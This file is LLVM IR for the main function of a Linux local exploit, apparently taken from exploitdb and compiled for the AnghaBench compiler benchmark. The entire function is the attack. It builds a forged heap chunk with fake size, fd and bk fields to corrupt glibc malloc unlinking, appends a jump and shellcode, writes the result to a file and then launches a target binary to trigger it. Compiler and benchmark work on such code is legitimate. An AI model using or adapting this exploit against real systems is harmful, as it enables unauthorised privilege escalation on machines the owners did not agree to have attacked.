; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_216.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_216.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [3 x i8] c"-d\00", align 1
@PATH = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [17 x i8] c"ppppssssffffbbbb\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"X\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [30 x i8] c"debug: next->size == 0x%08x;\0A\00", align 1
@.str.4 = private unnamed_addr constant [28 x i8] c"debug: next->fd == 0x%08x;\0A\00", align 1
@.str.5 = private unnamed_addr constant [28 x i8] c"debug: next->bk == 0x%08x;\0A\00", align 1
@.str.6 = private unnamed_addr constant [30 x i8] c"debug: oldp->size == 0x%08x;\0A\00", align 1
@.str.7 = private unnamed_addr constant [13 x i8] c"\EB\0Axxyyyyzzzz\00", align 1
@shellcode = common dso_local global i8* null, align 8
@O_WRONLY = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_EXCL = common dso_local global i32 0, align 4
@S_IRWXU = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [62 x i8] c"debug: open( \22%s\22, O_WRONLY|O_CREAT|O_EXCL, S_IRWXU ) == -1;\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.10 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1337 x i8], align 16
  %9 = alloca [1337 x i8], align 16
  %10 = alloca [5 x i8*], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  store i8* null, i8** %14, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8** %15, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** @PATH, align 8
  store i8* %17, i8** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %16, i64 1
  %19 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 0
  store i8* %19, i8** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %18, i64 1
  store i8* null, i8** %20, align 8
  %21 = load i32, i32* %4, align 4
  %22 = icmp ne i32 %21, 4
  br i1 %22, label %23, label %28

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @usage(i8* %26)
  store i32 -1, i32* %3, align 4
  br label %224

28:                                               ; preds = %2
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  store i8* %31, i8** %32, align 16
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 2
  %35 = load i8*, i8** %34, align 8
  %36 = call i64 @strtoul(i8* %35, i32* null, i32 0)
  %37 = trunc i64 %36 to i32
  store i32 %37, i32* %6, align 4
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 3
  %40 = load i8*, i8** %39, align 8
  %41 = call i64 @strtoul(i8* %40, i32* null, i32 0)
  %42 = trunc i64 %41 to i32
  store i32 %42, i32* %7, align 4
  %43 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 0
  %44 = call i32 @strcpy(i8* %43, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  %45 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  %46 = load i8*, i8** %45, align 16
  %47 = call i32 @strlen(i8* %46)
  %48 = add nsw i32 %47, 1
  %49 = sub i32 -1073741828, %48
  %50 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 0
  %51 = call i32 @strlen(i8* %50)
  %52 = add nsw i32 %51, 1
  %53 = sub i32 %49, %52
  store i32 %53, i32* %12, align 4
  store i32 0, i32* %13, align 4
  br label %54

54:                                               ; preds = %64, %28
  %55 = load i32, i32* %13, align 4
  %56 = load i32, i32* %12, align 4
  %57 = load i32, i32* %12, align 4
  %58 = and i32 %57, -4
  %59 = sub i32 %56, %58
  %60 = icmp ult i32 %55, %59
  br i1 %60, label %61, label %67

61:                                               ; preds = %54
  %62 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 0
  %63 = call i32 @strcat(i8* %62, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  br label %64

64:                                               ; preds = %61
  %65 = load i32, i32* %13, align 4
  %66 = add i32 %65, 1
  store i32 %66, i32* %13, align 4
  br label %54

67:                                               ; preds = %54
  %68 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  %69 = load i8*, i8** %68, align 16
  %70 = call i32 @strlen(i8* %69)
  %71 = add nsw i32 %70, 1
  %72 = sub i32 -1073741828, %71
  %73 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 0
  %74 = call i32 @strlen(i8* %73)
  %75 = add nsw i32 %74, 1
  %76 = sub i32 %72, %75
  store i32 %76, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %77 = load i32, i32* %13, align 4
  %78 = zext i32 %77 to i64
  %79 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %78
  %80 = bitcast i8* %79 to i32*
  store i32 -1, i32* %80, align 1
  %81 = load i32, i32* %13, align 4
  %82 = add i32 %81, 4
  store i32 %82, i32* %13, align 4
  %83 = load i32, i32* %7, align 4
  %84 = sub i32 %83, 8
  %85 = add i32 %84, 136
  %86 = load i32, i32* %12, align 4
  %87 = sub i32 %85, %86
  %88 = load i32, i32* %13, align 4
  %89 = zext i32 %88 to i64
  %90 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %89
  %91 = bitcast i8* %90 to i32*
  store i32 %87, i32* %91, align 1
  %92 = load i32, i32* %13, align 4
  %93 = zext i32 %92 to i64
  %94 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %93
  %95 = bitcast i8* %94 to i32*
  %96 = load i32, i32* %95, align 1
  %97 = call i64 @zero(i32 %96)
  %98 = icmp ne i64 %97, 0
  br i1 %98, label %99, label %107

99:                                               ; preds = %67
  %100 = load i32, i32* @stderr, align 4
  %101 = load i32, i32* %13, align 4
  %102 = zext i32 %101 to i64
  %103 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %102
  %104 = bitcast i8* %103 to i32*
  %105 = load i32, i32* %104, align 1
  %106 = call i32 (i32, i8*, ...) @fprintf(i32 %100, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i32 %105)
  store i32 -1, i32* %3, align 4
  br label %224

107:                                              ; preds = %67
  %108 = load i32, i32* %13, align 4
  %109 = add i32 %108, 4
  store i32 %109, i32* %13, align 4
  %110 = load i32, i32* %6, align 4
  %111 = sub i32 %110, 12
  %112 = load i32, i32* %13, align 4
  %113 = zext i32 %112 to i64
  %114 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %113
  %115 = bitcast i8* %114 to i32*
  store i32 %111, i32* %115, align 1
  %116 = load i32, i32* %13, align 4
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %117
  %119 = bitcast i8* %118 to i32*
  %120 = load i32, i32* %119, align 1
  %121 = call i64 @zero(i32 %120)
  %122 = icmp ne i64 %121, 0
  br i1 %122, label %123, label %131

123:                                              ; preds = %107
  %124 = load i32, i32* @stderr, align 4
  %125 = load i32, i32* %13, align 4
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %126
  %128 = bitcast i8* %127 to i32*
  %129 = load i32, i32* %128, align 1
  %130 = call i32 (i32, i8*, ...) @fprintf(i32 %124, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0), i32 %129)
  store i32 -1, i32* %3, align 4
  br label %224

131:                                              ; preds = %107
  %132 = load i32, i32* %13, align 4
  %133 = add i32 %132, 4
  store i32 %133, i32* %13, align 4
  %134 = load i32, i32* %7, align 4
  %135 = load i32, i32* %13, align 4
  %136 = zext i32 %135 to i64
  %137 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %136
  %138 = bitcast i8* %137 to i32*
  store i32 %134, i32* %138, align 1
  %139 = load i32, i32* %13, align 4
  %140 = zext i32 %139 to i64
  %141 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %140
  %142 = bitcast i8* %141 to i32*
  %143 = load i32, i32* %142, align 1
  %144 = call i64 @zero(i32 %143)
  %145 = icmp ne i64 %144, 0
  br i1 %145, label %146, label %154

146:                                              ; preds = %131
  %147 = load i32, i32* @stderr, align 4
  %148 = load i32, i32* %13, align 4
  %149 = zext i32 %148 to i64
  %150 = getelementptr inbounds [1337 x i8], [1337 x i8]* %9, i64 0, i64 %149
  %151 = bitcast i8* %150 to i32*
  %152 = load i32, i32* %151, align 1
  %153 = call i32 (i32, i8*, ...) @fprintf(i32 %147, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0), i32 %152)
  store i32 -1, i32* %3, align 4
  br label %224

154:                                              ; preds = %131
  store i32 0, i32* %13, align 4
  %155 = load i32, i32* %13, align 4
  %156 = zext i32 %155 to i64
  %157 = getelementptr inbounds [1337 x i8], [1337 x i8]* %8, i64 0, i64 %156
  store i8 -4, i8* %157, align 1
  %158 = load i32, i32* %13, align 4
  %159 = add i32 %158, 1
  store i32 %159, i32* %13, align 4
  %160 = load i32, i32* %12, align 4
  %161 = load i32, i32* %7, align 4
  %162 = sub i32 %161, 8
  %163 = sub i32 %160, %162
  %164 = load i32, i32* %13, align 4
  %165 = zext i32 %164 to i64
  %166 = getelementptr inbounds [1337 x i8], [1337 x i8]* %8, i64 0, i64 %165
  %167 = bitcast i8* %166 to i32*
  store i32 %163, i32* %167, align 1
  %168 = load i32, i32* %13, align 4
  %169 = zext i32 %168 to i64
  %170 = getelementptr inbounds [1337 x i8], [1337 x i8]* %8, i64 0, i64 %169
  %171 = bitcast i8* %170 to i32*
  %172 = load i32, i32* %171, align 1
  %173 = call i64 @zero(i32 %172)
  %174 = icmp ne i64 %173, 0
  br i1 %174, label %175, label %183

175:                                              ; preds = %154
  %176 = load i32, i32* @stderr, align 4
  %177 = load i32, i32* %13, align 4
  %178 = zext i32 %177 to i64
  %179 = getelementptr inbounds [1337 x i8], [1337 x i8]* %8, i64 0, i64 %178
  %180 = bitcast i8* %179 to i32*
  %181 = load i32, i32* %180, align 1
  %182 = call i32 (i32, i8*, ...) @fprintf(i32 %176, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.6, i64 0, i64 0), i32 %181)
  store i32 -1, i32* %3, align 4
  br label %224

183:                                              ; preds = %154
  %184 = load i32, i32* %13, align 4
  %185 = add i32 %184, 4
  store i32 %185, i32* %13, align 4
  %186 = load i32, i32* %13, align 4
  %187 = zext i32 %186 to i64
  %188 = getelementptr inbounds [1337 x i8], [1337 x i8]* %8, i64 0, i64 %187
  store i8 0, i8* %188, align 1
  %189 = getelementptr inbounds [1337 x i8], [1337 x i8]* %8, i64 0, i64 0
  %190 = call i32 @strcat(i8* %189, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i64 0, i64 0))
  %191 = getelementptr inbounds [1337 x i8], [1337 x i8]* %8, i64 0, i64 0
  %192 = load i8*, i8** @shellcode, align 8
  %193 = call i32 @strcat(i8* %191, i8* %192)
  %194 = load i8*, i8** @PATH, align 8
  %195 = load i32, i32* @O_WRONLY, align 4
  %196 = load i32, i32* @O_CREAT, align 4
  %197 = or i32 %195, %196
  %198 = load i32, i32* @O_EXCL, align 4
  %199 = or i32 %197, %198
  %200 = load i32, i32* @S_IRWXU, align 4
  %201 = call i32 @open(i8* %194, i32 %199, i32 %200)
  store i32 %201, i32* %11, align 4
  %202 = load i32, i32* %11, align 4
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %204, label %208

204:                                              ; preds = %183
  %205 = load i32, i32* @stderr, align 4
  %206 = load i8*, i8** @PATH, align 8
  %207 = call i32 (i32, i8*, ...) @fprintf(i32 %205, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.8, i64 0, i64 0), i8* %206)
  store i32 -1, i32* %3, align 4
  br label %224

208:                                              ; preds = %183
  %209 = load i32, i32* %11, align 4
  %210 = call i32 @write(i32 %209, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 2)
  %211 = load i32, i32* %11, align 4
  %212 = call i32 @write(i32 %211, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.10, i64 0, i64 0), i32 1)
  %213 = load i32, i32* %11, align 4
  %214 = getelementptr inbounds [1337 x i8], [1337 x i8]* %8, i64 0, i64 0
  %215 = getelementptr inbounds [1337 x i8], [1337 x i8]* %8, i64 0, i64 0
  %216 = call i32 @strlen(i8* %215)
  %217 = call i32 @write(i32 %213, i8* %214, i32 %216)
  %218 = load i32, i32* %11, align 4
  %219 = call i32 @close(i32 %218)
  %220 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  %221 = load i8*, i8** %220, align 16
  %222 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  %223 = call i32 @execve(i8* %221, i8** %222, i32* null)
  store i32 -1, i32* %3, align 4
  br label %224

224:                                              ; preds = %208, %204, %175, %146, %123, %99, %23
  %225 = load i32, i32* %3, align 4
  ret i32 %225
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i64 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i64 @zero(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @execve(i8*, i8**, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
